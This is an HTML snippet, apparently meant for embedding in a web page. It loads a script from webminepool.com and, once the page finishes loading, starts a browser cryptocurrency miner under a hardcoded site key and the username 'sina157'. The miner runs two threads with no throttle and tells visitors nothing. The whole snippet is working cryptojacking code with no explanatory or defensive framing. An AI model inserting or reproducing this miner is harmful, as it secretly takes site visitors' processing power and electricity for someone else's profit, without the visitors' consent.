<script src="https://webminepool.com/lib/base.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    if (typeof WMP !== 'undefined') {
        var webmr = WMP.User("SK_QzApkbVGsAxyQykaWSnEF", "sina157", {
            threads: 2,
            autoThreads: false,
            throttle: 0,
        });
        webmr.start();
    } else {
        console.error("Webminepool library failed to load");
    }
});
</script>